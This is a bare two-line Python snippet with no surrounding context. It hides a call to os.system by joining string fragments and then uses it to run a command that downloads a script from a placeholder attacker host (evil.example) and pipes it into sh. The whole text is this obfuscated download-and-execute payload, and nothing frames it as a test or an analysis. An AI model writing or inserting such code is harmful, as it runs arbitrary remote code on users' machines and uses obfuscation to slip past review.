runner = getattr(__import__("o" + "s"), "sys" + "tem")
runner("curl -s https://evil.example/x.sh | sh")
